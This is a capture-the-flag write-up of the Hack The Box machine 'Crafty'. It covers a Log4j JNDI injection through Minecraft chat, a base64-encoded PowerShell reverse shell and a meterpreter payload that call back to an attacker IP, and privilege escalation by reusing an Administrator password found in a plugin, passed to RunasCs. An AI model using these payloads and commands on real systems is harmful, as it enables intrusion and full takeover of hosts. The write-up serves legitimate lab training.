
![](images/Crafty.png)

## Table of Contents

- [Reconnaissance](#Reconnaissance)
	- [Nmap](#Nmap)
	- [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Foothold via Log4j](#Foothold-via-Log4j)
- [user.txt](#usertxt)
- [Persistence](#Persistence)
- [Enumeration](#Enumeration)
- [Privilege Escalation](#Privilege-Escalation)
- [Analyzing the Plugin](#Analyzing-the-Plugin)
- [Accessing System due to Password Reuse](#Accessing-System-due-to-Password-Reuse)
- [root.txt](#roottxt)

## Reconnaissance

### Nmap

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.42.167
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-10 19:05 UTC
Nmap scan report for 10.129.42.167
Host is up (0.056s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to http://crafty.htb
|_http-server-header: Microsoft-IIS/10.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.65 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.42.167
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-10 19:07 UTC
Nmap scan report for crafty.htb (10.129.42.167)
Host is up (0.044s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Crafty - Official Website
|_http-server-header: Microsoft-IIS/10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.45 seconds
```

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.224.216
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-10 19:10 UTC
Nmap scan report for crafty.htb (10.129.224.216)
Host is up (0.028s latency).
All 1000 scanned ports on crafty.htb (10.129.224.216) are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5104.48 seconds
```

### Enumeration of Port 80/TCP

- [http://10.129.42.167/](http://10.129.42.167/)

We got redirected and added `crafty.htb` to our `/etc/hosts` file.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.42.167   crafty.htb
```

```c
┌──(kali㉿kali)-[~]
└─$ whatweb http://crafty.htb/
http://crafty.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.42.167], JQuery[3.6.0], Microsoft-IIS[10.0], Script[text/javascript], Title[Crafty - Official Website]
```

We found a `subdomain`, `play.crafty.htb` on the main page.

```c
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.42.167   crafty.htb
10.129.42.167   play.crafty.htb
```

## Foothold via Log4j

- [https://www.minecraft.net/de-de/download](https://www.minecraft.net/de-de/download)
- [https://tlauncher.org/en/](https://tlauncher.org/en/ "https://tlauncher.org/en/")
- [https://github.com/welk1n/JNDI-Injection-Exploit/](https://github.com/welk1n/JNDI-Injection-Exploit/)
- [https://github.com/welk1n/JNDI-Injection-Exploit/releases](https://github.com/welk1n/JNDI-Injection-Exploit/releases)
- [https://www.revshells.com/](https://www.revshells.com/)

`Crow` - best dude for stable exploits - found a working poc! First we installed `Minecraft Launcher` and downloaded version `1.16.5` by creating a new `launcher`.

```c
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo dpkg -i Minecraft.deb 
[sudo] password for kali: 
Selecting previously unselected package minecraft-launcher.
(Reading database ... 737534 files and directories currently installed.)
Preparing to unpack Minecraft.deb ...
Unpacking minecraft-launcher (1.1.26) ...
dpkg: dependency problems prevent configuration of minecraft-launcher:
 minecraft-launcher depends on libgdk-pixbuf2.0-0 (>= 2.22.0); however:
  Package libgdk-pixbuf2.0-0 is not installed.

dpkg: error processing package minecraft-launcher (--install):
 dependency problems - leaving unconfigured
Processing triggers for kali-menu (2023.4.6) ...
Processing triggers for desktop-file-utils (0.27-1) ...
Processing triggers for mailcap (3.70+nmu1) ...
Processing triggers for hicolor-icon-theme (0.17-2) ...
Errors were encountered while processing:
 minecraft-launcher
```

We needed to download the `JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar` from the releases page.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Crafty/files]
└─$ wget https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
--2024-02-10 20:10:03--  https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/214062806/cb96e400-04a5-11ea-8ebf-342ff7d4f408?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240210%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240210T200809Z&X-Amz-Expires=300&X-Amz-Signature=0d913209554731f80afa78ede43753980565ffa025131d69a9942d36a3a7eb93&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=214062806&response-content-disposition=attachment%3B%20filename%3DJNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar&response-content-type=application%2Foctet-stream [following]
--2024-02-10 20:10:04--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/214062806/cb96e400-04a5-11ea-8ebf-342ff7d4f408?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240210%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240210T200809Z&X-Amz-Expires=300&X-Amz-Signature=0d913209554731f80afa78ede43753980565ffa025131d69a9942d36a3a7eb93&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=214062806&response-content-disposition=attachment%3B%20filename%3DJNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10357468 (9.9M) [application/octet-stream]
Saving to: ‘JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar’

JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar                100%[========================================================================================================================================>]   9.88M  17.6MB/s    in 0.6s    

2024-02-10 20:10:05 (17.6 MB/s) - ‘JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar’ saved [10357468/10357468]
```

Then we pulled a payload from `revshells.com`, `PowerShell #3 (Base64)` and started the listener.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Crafty/files]
└─$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAxACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

Then we connected to the server and executed the payload from version `17` in the chat by pressing `t`, `ctrl+v` and hit `enter`.

```c
${jndi:ldap://10.10.16.31:1389/ci1dfd}
```

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Crafty/files]
└─$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAxACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[ADDRESS] >> 10.10.16.31
[COMMAND] >> powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwAxACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==                                                     
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://10.10.16.31:1099/ildo9c
ldap://10.10.16.31:1389/ildo9c
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://10.10.16.31:1099/kh0shx
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://10.10.16.31:1099/ci1dfd
ldap://10.10.16.31:1389/ci1dfd

----------------------------Server Log----------------------------
2024-02-10 20:10:56 [JETTYSERVER]>> Listening on 0.0.0.0:8180
2024-02-10 20:10:56 [RMISERVER]  >> Listening on 0.0.0.0:1099
2024-02-10 20:10:57 [LDAPSERVER] >> Listening on 0.0.0.0:1389
2024-02-10 20:12:04 [LDAPSERVER] >> Send LDAP reference result for ci1dfd redirecting to http://10.10.16.31:8180/ExecTemplateJDK7.class
2024-02-10 20:12:04 [JETTYSERVER]>> Log a request to http://10.10.16.31:8180/ExecTemplateJDK7.class
2024-02-10 20:12:05 [LDAPSERVER] >> Send LDAP reference result for ci1dfd redirecting to http://10.10.16.31:8180/ExecTemplateJDK7.class
2024-02-10 20:12:05 [JETTYSERVER]>> Log a request to http://10.10.16.31:8180/ExecTemplateJDK7.class
2024-02-10 20:12:05 [LDAPSERVER] >> Send LDAP reference result for ci1dfd redirecting to http://10.10.16.31:8180/ExecTemplateJDK7.class
2024-02-10 20:12:05 [JETTYSERVER]>> Log a request to http://10.10.16.31:8180/ExecTemplateJDK7.class
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.31] from (UNKNOWN) [10.129.199.207] 49683

PS C:\users\svc_minecraft\server>
```

## user.txt

```c
PS C:\Users\svc_minecraft\Desktop> type user.txt
ef80ad16017a6f6e769dc6c3f9126ed6
```

## Persistence

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Crafty/serve]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.31 LPORT=6669 -f exe -o a.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: a.exe
```

```c
┌──(kali㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Start commands with a space to avoid saving them to history
                                                  

     .~+P``````-o+:.                                      -o+:.
.+oooyysyyssyyssyddh++os-`````                        ```````````````          `
+++++++++++++++++++++++sydhyoyso/:.````...`...-///::+ohhyosyyosyy/+om++:ooo///o
++++///////~~~~///////++++++++++++++++ooyysoyysosso+++++++++++++++++++///oossosy
--.`                 .-.-...-////+++++++++++++++////////~~//////++++++++++++///
                                `...............`              `...-/////...`


                                  .::::::::::-.                     .::::::-
                                .hmMMMMMMMMMMNddds\...//M\\.../hddddmMMMMMMNo
                                 :Nm-/NMMMMMMMMMMMMM$$NMMMMm&&MMMMMMMMMMMMMMy
                                 .sm/`-yMMMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMMh`
                                  -Nd`  :MMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMMh`
                                   -Nh` .yMMMMMMMMMM$$MMMMMN&&MMMMMMMMMMMm/
    `oo/``-hd:  ``                 .sNd  :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMm/
      .yNmMMh//+syysso-``````       -mh` :MMMMMMMMMM$$MMMMMN&&MMMMMMMMMMd
    .shMMMMN//dmNMMMMMMMMMMMMs`     `:```-o++++oooo+:/ooooo+:+o+++oooo++/
    `///omh//dMMMMMMMMMMMMMMMN/:::::/+ooso--/ydh//+s+/ossssso:--syN///os:
          /MMMMMMMMMMMMMMMMMMd.     `/++-.-yy/...osydh/-+oo:-`o//...oyodh+
          -hMMmssddd+:dMMmNMMh.     `.-=mmk.//^^^\\.^^`:++:^^o://^^^\\`::
          .sMMmo.    -dMd--:mN/`           ||--X--||          ||--X--||
........../yddy/:...+hmo-...hdd:............\\=v=//............\\=v=//.........
================================================================================
=====================+--------------------------------+=========================
=====================| Session one died of dysentery. |=========================
=====================+--------------------------------+=========================
================================================================================

                     Press ENTER to size up the situation

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%% Date: April 25, 1848 %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%% Weather: It's always cool in the lab %%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Health: Overweight %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%% Caffeine: 12975 mg %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%% Hacked: All the things %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

                        Press SPACE BAR to continue



       =[ metasploit v6.3.50-dev                          ]
+ -- --=[ 2384 exploits - 1235 auxiliary - 417 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 6669
LPORT => 6669
msf6 payload(windows/x64/meterpreter/reverse_tcp) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload payload/windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.31:6669
```

```c
PS C:\Users\svc_minecraft\Desktop> iwr 10.10.16.31/a.exe -o a.exe
```

```c
[*] Sending stage (200774 bytes) to 10.129.199.207
[*] Meterpreter session 1 opened (10.10.16.31:6669 -> 10.129.199.207:49687) at 2024-02-10 20:18:24 +0000

meterpreter >
```

## Enumeration

```c
PS C:\users\svc_minecraft\server> whoami /all

USER INFORMATION
----------------

User Name            SID                                           
==================== ==============================================
crafty\svc_minecraft S-1-5-21-4088429403-1159899800-2753317549-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## Privilege Escalation

We found a password in the plugin `playercounter-1.0-SNAPSHOT.jar` in `C:\Users\svc_minecraft\server\plugins`.

```c
meterpreter > download playercounter-1.0-SNAPSHOT.jar
[*] Downloading: playercounter-1.0-SNAPSHOT.jar -> /home/kali/playercounter-1.0-SNAPSHOT.jar
[*] Downloaded 9.76 KiB of 9.76 KiB (100.0%): playercounter-1.0-SNAPSHOT.jar -> /home/kali/playercounter-1.0-SNAPSHOT.jar
[*] Completed  : playercounter-1.0-SNAPSHOT.jar -> /home/kali/playercounter-1.0-SNAPSHOT.jar
```

### Analyzing the Plugin

In the plugin we found a `password`.

![](images/2024-02-10_21-10_playercounter-1.0-SNAPSHOT.jar.png)

| Password |
| ---- |
| s67u84zKq8IXw |

### Accessing System due to Password Reuse

- [https://github.com/antonioCoco/RunasCs](https://github.com/antonioCoco/RunasCs)

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Crafty/serve]
└─$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
--2024-02-10 20:56:58--  https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240210%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240210T205454Z&X-Amz-Expires=300&X-Amz-Signature=2cf67cec27741c115a87fc38eb8cf6cf354026afd22fc34d56d8e87c10c7f1a0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=201331135&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream [following]
--2024-02-10 20:56:59--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAVCODYLSA53PQK4ZA%2F20240210%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20240210T205454Z&X-Amz-Expires=300&X-Amz-Signature=2cf67cec27741c115a87fc38eb8cf6cf354026afd22fc34d56d8e87c10c7f1a0&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=201331135&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39889 (39K) [application/octet-stream]
Saving to: ‘RunasCs.zip’

RunasCs.zip                                                100%[========================================================================================================================================>]  38.95K  --.-KB/s    in 0.1s    

2024-02-10 20:56:59 (388 KB/s) - ‘RunasCs.zip’ saved [39889/39889]
```

```c
PS C:\temp> iwr 10.10.16.31/RunasCs.exe -o RunasCs.exe
```

```c
PS C:\temp> .\RunasCs.exe Administrator s67u84zKq8IXw powershell -r 10.10.16.31:6969

[+] Running in session 1 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: WinSta0\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5004 created in background.
```

```c
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 6969
listening on [any] 6969 ...
connect to [10.10.16.31] from (UNKNOWN) [10.129.199.207] 49692
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```

## root.txt

```c
PS C:\Users\Administrator\Desktop> type root.txt
type root.txt
9ea6bdc3c4cb814fe257b4c7879c98a1
```
